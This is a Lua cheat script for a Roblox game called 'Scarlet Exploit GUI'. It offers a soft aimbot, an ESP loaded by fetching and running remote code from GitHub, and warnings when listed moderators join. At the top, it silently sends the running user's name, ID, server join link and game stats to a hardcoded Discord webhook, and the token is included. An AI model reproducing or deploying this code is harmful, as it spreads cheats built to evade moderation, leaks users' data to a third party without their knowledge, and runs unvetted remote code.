-- Scarlet Exploit GUI v0.1+ (with requested scripts and NO Q keybind toggle)
-- MOD DETECTION + NEW DISCORD LOGGER (STATS) + CORRECT OPENANDCLOSE BUTTON LOGIC

-- === DISCORD WEBHOOK LOGGER (NEW VERSION) ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Helper to fetch stat from a folder or default to 0
local function getStat(folder, stat)
    if player and player:FindFirstChild(folder) and player[folder]:FindFirstChild(stat) then
        return player[folder][stat].Value
    else
        return 0
    end
end

-- Main stats
local coins = getStat("leaderstats", "Coins")
local rank = getStat("leaderstats", "Rank")
local rubies = getStat("leaderstats", "Rubies")
local currentBounty = getStat("Infamy", "CurrentBounty")
local infamyDeaths = getStat("Infamy", "Deaths")
local infamyKills = getStat("Infamy", "Kills")
local power = getStat("Infamy", "Power")

-- OTHER folder stats
local otherKills = getStat("Other", "Kills")
local assists = getStat("Other", "Assists")
local otherDeaths = getStat("Other", "Deaths")

local jobId = (game.JobId and tostring(game.JobId)) or "N/A"
local placeId = (game.PlaceId and tostring(game.PlaceId)) or "N/A"
local timeString = os.date("!%Y-%m-%d %H:%M:%S")

local webhookUrl = "https://discord.com/api/webhooks/1411001335087894618/0p7Q5O6mnOYl6htvMCqpKptK8V3BpULYS1QCdejbmZsZFWG6RZFXD2Mj9xWubyKMSiKn"

local embed = {
    ["title"] = "Troll exploit triggered!",
    ["description"] = string.format(
        "Player: %s (ID: %s) [Profile](https://www.roblox.com/users/%s/profile)\n" ..
        "ServerJobId: %s\n" ..
        "JoinGame: https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s\n" ..
        "PlaceId: %s\n" ..
        "Time: %s\n\n" ..
        "HT INFO\n\n" ..
        "**USER STATS**\n" ..
        "```lua\nRank: %s\nCoins: %s\nRubies: %s\n```\n" ..
        "**INFAMY**\n" ..
        "```lua\nCurrentBounty: %s\nDeaths: %s\nKills: %s\nPower: %s\n```\n" ..
        "**OTHER**\n" ..
        "```lua\nKills: %s\nAssists: %s\nDeaths: %s\n```",
        player.Name, player.UserId, player.UserId,
        jobId,
        placeId, jobId,
        placeId,
        timeString,
        rank, coins, rubies,
        currentBounty, infamyDeaths, infamyKills, power,
        otherKills, assists, otherDeaths
    ),
    ["color"] = 16711680
}

local data = {["embeds"] = {embed}}
local jsonData = HttpService:JSONEncode(data)

local response = request or http_request or (syn and syn.request)
if response then
    response({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = jsonData
    })
end

-- === MOD DETECTION ===

local WatchList = {
    ["hky_o"] = true,
    ["generalsoccer123"] = true,
    ["IAmaProforNot"] = true,
    ["Snuver"] = true,
    ["Myro201701"] = true,
    ["BigOne_Screeeeee"] = true,
    ["BigOne_Screeeeeee"] = true,
    ["fartmaster17689"] = true,
    ["paraIyza"] = true,
    ["Melon_Sensei"] = true,
    ["sfxxez"] = true,
    ["Sfxxezthesecond"] = true
}

local function ShowWarning(username)
    local playerGui = player:WaitForChild("PlayerGui")
    local screenGui = playerGui:FindFirstChild("ModWarningGui")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "ModWarningGui"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = playerGui
    end
    for _, child in ipairs(screenGui:GetChildren()) do
        if child:IsA("TextLabel") and child.Name == "Warning_" .. username then
            child:Destroy()
        end
    end

    local label = Instance.new("TextLabel")
    label.Name = "Warning_" .. username
    label.Size = UDim2.new(0.5, 0, 0.1, 0)
    label.Position = UDim2.new(0.25, 0, 0.05, 0)
    label.BackgroundColor3 = Color3.new(1, 0, 0)
    label.BackgroundTransparency = 0
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.TextStrokeTransparency = 0.2
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.Text = "⚠️ Mod Detected: " .. username .. " ⚠️"
    label.Parent = screenGui

    game:GetService("TweenService"):Create(label, TweenInfo.new(8), {
        TextTransparency = 1,
        BackgroundTransparency = 1
    }):Play()
    game:GetService("Debris"):AddItem(label, 8.5)
end

Players.PlayerAdded:Connect(function(p)
    if p ~= player and WatchList[p.Name] then
        ShowWarning(p.Name)
    end
end)
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= player and WatchList[p.Name] then
        ShowWarning(p.Name)
    end
end

-- === GUI CREATION ===

local guiParent
pcall(function() guiParent = game:GetService("CoreGui") end)
if not guiParent then guiParent = player:WaitForChild("PlayerGui") end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Name = "SCARLET_GUI"
ScreenGui.Parent = guiParent

-- OPENANDCLOSE BUTTON
local OPENANDCLOSE = Instance.new("TextButton")
OPENANDCLOSE.Name = "OPENANDCLOSE"
OPENANDCLOSE.TextWrapped = true
OPENANDCLOSE.BorderSizePixel = 0
OPENANDCLOSE.RichText = true
OPENANDCLOSE.TextScaled = true
OPENANDCLOSE.BackgroundColor3 = Color3.new(0, 0, 0)
OPENANDCLOSE.FontFace = Font.new("rbxasset://fonts/families/SourceSansPro.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
OPENANDCLOSE.TextSize = 45
OPENANDCLOSE.Size = UDim2.new(0, 129, 0, 34)
OPENANDCLOSE.TextColor3 = Color3.new(0, 0, 0)
OPENANDCLOSE.BorderColor3 = Color3.new(0, 0, 0)
OPENANDCLOSE.Text = "Scarlet hub"
OPENANDCLOSE.BackgroundTransparency = 0.5
OPENANDCLOSE.Position = UDim2.new(0.42, 0, 0.06, 0)
OPENANDCLOSE.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.Parent = OPENANDCLOSE

-- Main Frame
local Frame = Instance.new("Frame")
Frame.Name = "Frame"
Frame.Size = UDim2.new(0, 383, 0, 468)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.Position = UDim2.new(0.06, 0, 0.32, 0)
Frame.BorderSizePixel = 0
Frame.BackgroundTransparency = 0.2
Frame.BackgroundColor3 = Color3.new(0, 0, 0)
Frame.Parent = ScreenGui

local TitleLabel = Instance.new("TextLabel")
TitleLabel.ZIndex = 3
TitleLabel.BorderSizePixel = 0
TitleLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TitleLabel.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TitleLabel.TextSize = 50
TitleLabel.Size = UDim2.new(0, 254, 0, 60)
TitleLabel.BorderColor3 = Color3.new(0, 0, 0)
TitleLabel.Text = "SCARLET v.0.1"
TitleLabel.TextColor3 = Color3.new(1, 1, 1)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0.17, 0, 0.03, 0)
TitleLabel.Parent = Frame

local Frame_1 = Instance.new("Frame")
Frame_1.Size = UDim2.new(0, 355, 0, 431)
Frame_1.BorderColor3 = Color3.new(1, 0, 0)
Frame_1.Position = UDim2.new(0.03, 0, 0.02, 0)
Frame_1.BackgroundTransparency = 0.1
Frame_1.BackgroundColor3 = Color3.new(0, 0, 0)
Frame_1.Parent = Frame

-- SOFT AIMBOT FOLDER
local FolderAimbot = Instance.new("Folder")
FolderAimbot.Parent = Frame

local SoftAimbotButton = Instance.new("TextButton")
SoftAimbotButton.ZIndex = 3
SoftAimbotButton.BackgroundColor3 = Color3.new(0, 0, 0)
SoftAimbotButton.FontFace = Font.new("rbxasset://fonts/families/Fondamento.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
SoftAimbotButton.TextSize = 60
SoftAimbotButton.Size = UDim2.new(0, 31, 0, 29)
SoftAimbotButton.TextColor3 = Color3.new(1, 1, 1)
SoftAimbotButton.BorderColor3 = Color3.new(1, 0.24, 0)
SoftAimbotButton.Text = ""
SoftAimbotButton.Position = UDim2.new(0.08, 0, 0.33, 0)
SoftAimbotButton.Parent = FolderAimbot

local SoftAimbotLabel = Instance.new("TextLabel")
SoftAimbotLabel.ZIndex = 3
SoftAimbotLabel.BorderSizePixel = 0
SoftAimbotLabel.BackgroundColor3 = Color3.new(1, 1, 1)
SoftAimbotLabel.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
SoftAimbotLabel.TextSize = 30
SoftAimbotLabel.Size = UDim2.new(0, 254, 0, 60)
SoftAimbotLabel.BorderColor3 = Color3.new(0, 0, 0)
SoftAimbotLabel.Text = "SOFT AIMBOT"
SoftAimbotLabel.TextColor3 = Color3.new(1, 1, 1)
SoftAimbotLabel.BackgroundTransparency = 1
SoftAimbotLabel.Position = UDim2.new(0.08, 0, 0.30, 0)
SoftAimbotLabel.Parent = FolderAimbot

-- ESP FOLDER
local FolderESP = Instance.new("Folder")
FolderESP.Parent = Frame

local ESPButton = Instance.new("TextButton")
ESPButton.ZIndex = 3
ESPButton.BackgroundColor3 = Color3.new(0, 0, 0)
ESPButton.FontFace = Font.new("rbxasset://fonts/families/Fondamento.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
ESPButton.TextSize = 60
ESPButton.Size = UDim2.new(0, 31, 0, 29)
ESPButton.TextColor3 = Color3.new(1, 1, 1)
ESPButton.BorderColor3 = Color3.new(1, 0.24, 0)
ESPButton.Text = ""
ESPButton.Position = UDim2.new(0.08, 0, 0.19, 0)
ESPButton.Parent = FolderESP

local ESPLabel = Instance.new("TextLabel")
ESPLabel.ZIndex = 3
ESPLabel.BorderSizePixel = 0
ESPLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ESPLabel.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
ESPLabel.TextSize = 30
ESPLabel.Size = UDim2.new(0, 254, 0, 60)
ESPLabel.BorderColor3 = Color3.new(0, 0, 0)
ESPLabel.Text = "ESP"
ESPLabel.TextColor3 = Color3.new(1, 1, 1)
ESPLabel.BackgroundTransparency = 1
ESPLabel.Position = UDim2.new(0.08, 0, 0.16, 0)
ESPLabel.Parent = FolderESP

-- === FEATURE LOGIC ===

-- ESP BUTTON LOGIC
local espActive = false
local espLoaded = false

ESPButton.MouseButton1Click:Connect(function()
    espActive = not espActive
    if espActive then
        ESPButton.Text = "X"
        ESPButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
        if not espLoaded then
            espLoaded = true
            loadstring(game:HttpGet('https://raw.githubusercontent.com/ic3w0lf22/Unnamed-ESP/master/UnnamedESP.lua'))()
        end
    else
        ESPButton.Text = ""
        ESPButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        -- ESP can't be unloaded; button just toggles the UI
    end
end)

-- SOFT AIMBOT BUTTON LOGIC
local softAimActive = false
local SOFT_AIM_RADIUS = 70
local SOFT_AIM_STRENGTH = 0.07

SoftAimbotButton.MouseButton1Click:Connect(function()
    softAimActive = not softAimActive
    if softAimActive then
        SoftAimbotButton.Text = "X"
        SoftAimbotButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
        SoftAimbotLabel.Text = "SOFT AIMBOT [ON]"
    else
        SoftAimbotButton.Text = ""
        SoftAimbotButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        SoftAimbotLabel.Text = "SOFT AIMBOT"
    end
end)

local function getClosestEnemy()
    local closest, dist = nil, math.huge
    for _,v in pairs(Players:GetPlayers()) do
        if v ~= player and v.Team ~= nil and player.Team ~= nil and v.Team ~= player.Team and v.Character and v.Character:FindFirstChild("Head") then
            local pos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(v.Character.Head.Position)
            if onScreen then
                local mousePos = game:GetService("UserInputService"):GetMouseLocation()
                local mag = (Vector2.new(pos.X, pos.Y) - mousePos).Magnitude
                if mag < dist then
                    dist = mag
                    closest = v
                end
            end
        end
    end
    return closest, dist
end

game:GetService("RunService").RenderStepped:Connect(function()
    if softAimActive then
        local target, dist = getClosestEnemy()
        if target and target.Character and target.Character:FindFirstChild("Head") and dist <= SOFT_AIM_RADIUS then
            local headPos = target.Character.Head.Position
            local camPos = workspace.CurrentCamera.CFrame.Position
            local currentLook = workspace.CurrentCamera.CFrame.LookVector
            local direction = (headPos - camPos).Unit
            local blendedLook = (currentLook:Lerp(direction, SOFT_AIM_STRENGTH)).Unit
            workspace.CurrentCamera.CFrame = CFrame.new(camPos, camPos + blendedLook)
        end
    end
end)

-- === LOCAL SCRIPT 1: Frame DRAGGABLE ===
do
    local UserInputService = game:GetService("UserInputService")
    local gui = Frame

    local dragging
    local dragInput
    local dragStart
    local startPos

    local function update(input)
        local delta = input.Position - dragStart
        gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    gui.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = gui.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    gui.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            if gui.Visible then
                update(input)
            end
        end
    end)
end

-- === LOCAL SCRIPT 2: OPENANDCLOSE logic (fixed, clean, matches old working logic!) ===
do
    local button = OPENANDCLOSE

    -- Button itself is draggable, active, selectable (like before)
    button.Draggable = true
    button.Active = true
    button.Selectable = true

    button.MouseButton1Click:Connect(function()
        ScreenGui.Frame.Visible = not ScreenGui.Frame.Visible
    end)
end